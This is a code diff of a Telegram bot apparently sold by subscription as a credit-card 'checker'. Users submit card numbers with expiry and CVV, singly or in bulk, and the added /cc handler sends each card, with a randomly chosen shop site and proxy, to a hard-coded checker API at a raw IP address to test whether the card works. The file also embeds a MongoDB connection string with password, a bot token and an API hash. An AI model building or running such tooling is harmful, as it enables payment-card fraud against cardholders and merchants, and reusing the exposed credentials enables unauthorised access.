@@ -1,122 +1,109 @@
 from telethon import TelegramClient, events
 from motor.motor_asyncio import AsyncIOMotorClient
 from datetime import datetime, timedelta
-import random, string, asyncio, threading, aiohttp, json, os
+import random, string, asyncio, threading, aiohttp, os
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 # --- RENDER HEALTH CHECK ---
-class HealthCheckHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b"Bot is alive!")
-
 def run_health_check():
-    server = HTTPServer(('0.0.0.0', 10000), HealthCheckHandler)
-    server.serve_forever()
-
+    class H(BaseHTTPRequestHandler):
+        def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b"OK")
+    HTTPServer(('0.0.0.0', 10000), H).serve_forever()
 threading.Thread(target=run_health_check, daemon=True).start()
 
-# --- CONFIGURATION ---
-# Integrated your specific MongoDB URI (Brackets removed from password)
+# --- CONFIG ---
 MONGO_URI = "mongodb+srv://riot_adminn:A2723Dscyq3gYhFi@cluster0.agit2bo.mongodb.net/?appName=Cluster0"
 ADMIN_ID = 5541778617
 BOT_TOKEN = '8284884126:AAFYSgVRWYh9ClQ-p6okChEyGyLnQo_OQaE'
 API_ID = 38807471
 API_HASH = '9bbfb9efe1a47596cf7f1b20017f5dc6'
 
-# Initialize MongoDB and Telegram Bot
 client = AsyncIOMotorClient(MONGO_URI)
 db = client.shop_checker_db
 bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-# --- SECURITY LOGIC ---
+# --- HELPERS ---
 async def is_premium(user_id):
     if user_id == ADMIN_ID: return True
     user = await db.users.find_one({"user_id": str(user_id)})
     if user:
-        expiry = datetime.strptime(user['expiry'], '%Y-%m-%d %H:%M:%S')
-        return expiry > datetime.now()
+        return datetime.strptime(user['expiry'], '%Y-%m-%d %H:%M:%S') > datetime.now()
     return False
 
-# --- EMOJI HELPERS ---
-PREMIUM_EMOJI_IDS = {
-    "✅": "6023660820544623088", 
-    "🔥": "5999340396432333728", 
-    "💠": "5971837723676249096", 
-    "🍄": "6023660820544623088",
-    "🔑": "5974235702701853774"
-}
-
-def p_emoji(text):
-    for emoji, doc_id in PREMIUM_EMOJI_IDS.items():
-        text = text.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
-    return text
-
 # --- COMMANDS ---
-
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
-    welcome = (
-        "<b>⚡💳 Welcome to Shopiiiii ! 💳⚡</b>\n"
-        "<b>━━━━━━━━━━━━━━━━━</b>\n"
-        "<b>⚡💠 𝐂𝐂 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
-        "<blockquote>• /cc card|mm|yy|cvv - Single Check\n"
-        "• /chk - Bulk Check (Reply to .txt)\n"
-        "• /bin 123456 - Get BIN info</blockquote>\n"
-        "<b>⚡💠 𝐀𝐜𝐜𝐞𝐬𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
-        "<blockquote>• /redeem [KEY] - Activate subscription</blockquote>\n"
-        "<b>⚡💠 𝐒𝐢𝐭𝐞 & 𝐏𝐫𝐨𝐱𝐲</b>\n"
-        "<blockquote>• /addsite [url] | /site (Status)\n"
-        "• /addproxy [proxy] | /proxy (Count)</blockquote>\n"
-        "<b>⚡💠 𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
-        "<blockquote>• /genkey [days] - Create access key\n"
-        "• /setapi [url] - Update Checker API</blockquote>\n"
-        "<b>━━━━━━━━━━━━━━━━━</b>\n"
-        "<b>Made wt ♥️: <a href='tg://user?id=5541778617'>P.o.Riot 🍄</a></b>"
-    )
-    await event.reply(p_emoji(welcome), parse_mode='html')
+    await event.reply("<b>⚡ Welcome to Shopiiiii ! ⚡</b>\nCommands: /cc, /chk, /bin, /redeem, /addproxy, /proxy, /addsite, /site, /genkey\n<b>Made wt ♥️: P.o.Riot 🍄</b>", parse_mode='html')
 
 @bot.on(events.NewMessage(pattern=r'^/genkey\s+(\d+)'))
-async def generate_key(event):
+async def genkey(event):
     if event.sender_id != ADMIN_ID: return
     days = int(event.pattern_match.group(1))
     key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
     await db.keys.insert_one({"key": key, "days": days})
-    await event.reply(p_emoji(f"🔑 **Key Generated & Saved to Cloud**\n`{key}` ({days} Days)\n**Made wt ♥️: P.o.Riot 🍄**"))
+    await event.reply(f"🔑 **Key Created:** `{key}` ({days} Days)")
 
-@bot.on(events.NewMessage(pattern=r'^/redeem\s+(\w+)'))
-async def redeem_key(event):
-    key_text = event.pattern_match.group(1)
-    key_doc = await db.keys.find_one_and_delete({"key": key_text})
-    if key_doc:
-        days = key_doc['days']
-        expiry_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
-        await db.users.update_one(
-            {"user_id": str(event.sender_id)},
-            {"$set": {"expiry": expiry_date}},
-            upsert=True
-        )
-        await event.reply(p_emoji(f"✅ **Success!** Subscription activated for {days} days.\n**Made wt ♥️: P.o.Riot 🍄**"))
-    else:
-        await event.reply(p_emoji("❌ **Invalid or Used Key.**"))
+@bot.on(events.NewMessage(pattern=r'^/addproxy'))
+async def add_proxy(event):
+    if not await is_premium(event.sender_id): return
+    raw = event.message.text.split('\n')[1:]
+    proxies = [p.strip() for p in raw if p.strip()]
+    if not proxies: return await event.reply("❌ Paste proxies on new lines below /addproxy")
+    await db.proxies.insert_many([{"proxy": p} for p in proxies])
+    await event.reply(f"✅ {len(proxies)} Proxies added to Cloud.")
 
-@bot.on(events.NewMessage(pattern=r'^/setapi\s+(.+)'))
-async def set_api(event):
-    if event.sender_id != ADMIN_ID: return
-    new_url = event.pattern_match.group(1).strip()
-    await db.config.update_one({"type": "settings"}, {"$set": {"api_url": new_url}}, upsert=True)
-    await event.reply(p_emoji(f"✅ **API Updated in Cloud!**\n**Made wt ♥️: P.o.Riot 🍄**"))
+@bot.on(events.NewMessage(pattern='/proxy'))
+async def show_proxy(event):
+    if not await is_premium(event.sender_id): return
+    count = await db.proxies.count_documents({})
+    await event.reply(f"💠 **Total Proxies:** `{count}`")
 
-@bot.on(events.NewMessage(pattern=r'^/addsite\s+'))
+@bot.on(events.NewMessage(pattern=r'^/addsite'))
 async def add_site(event):
     if not await is_premium(event.sender_id): return
-    urls = event.message.text.replace('/addsite ', '').split()
-    with open('sites.txt', 'a') as f:
-        for url in urls: f.write(f"{url}\n")
-    await event.reply(p_emoji("✅ Sites added by **P.o.Riot 🍄**"))
+    raw = event.message.text.split('\n')[1:]
+    sites = [s.strip() for s in raw if s.strip().startswith('http')]
+    if not sites: return await event.reply("❌ Paste URLs below /addsite")
+    await db.sites.insert_many([{"url": s} for s in sites])
+    await event.reply(f"✅ {len(sites)} Sites added to Cloud.")
 
-# --- STARTUP ---
-print("✅ Bot is online with MONGODB - Made wt ♥️ by P.o.Riot 🍄")
+@bot.on(events.NewMessage(pattern='/site'))
+async def show_site(event):
+    if not await is_premium(event.sender_id): return
+    count = await db.sites.count_documents({})
+    await event.reply(f"💠 **Total Sites:** `{count}`")
+
+@bot.on(events.NewMessage(pattern=r'^/cc\s+(.+)'))
+async def cc_check(event):
+    if not await is_premium(event.sender_id): return
+    card = event.pattern_match.group(1).strip()
+    
+    # Get random site and proxy from DB
+    site_doc = await db.sites.aggregate([{"$sample": {"size": 1}}]).to_list(1)
+    proxy_doc = await db.proxies.aggregate([{"$sample": {"size": 1}}]).to_list(1)
+    
+    if not site_doc or not proxy_doc:
+        return await event.reply("❌ Add sites and proxies first!")
+
+    target_site = site_doc[0]['url']
+    target_proxy = proxy_doc[0]['proxy']
+    
+    msg = await event.reply(f"⌛ **Checking Card...**\n`{card}`")
+    
+    try:
+        # This uses your new Endpoint structure
+        api_url = f"http://148.230.102.178:8081/?{card}"
+        params = {'url': target_site, 'proxy': target_proxy}
+        
+        async with aiohttp.ClientSession() as session:
+            async with session.get(api_url, params=params, timeout=60) as resp:
+                res = await resp.json(content_type=None)
+                # Format response based on your API structure
+                status = res.get('Status', 'Unknown')
+                response = res.get('Response', 'No response')
+                await msg.edit(f"💳 **Card:** `{card}`\n🎯 **Status:** {status}\n💬 **Result:** {response}\n🌐 **Site:** {target_site}")
+    except Exception as e:
+        await msg.edit(f"❌ **API Error:** {str(e)}")
+
+print("✅ Bot fully synchronized with MongoDB - P.o.Riot 🍄")
 bot.run_until_disconnected()
-
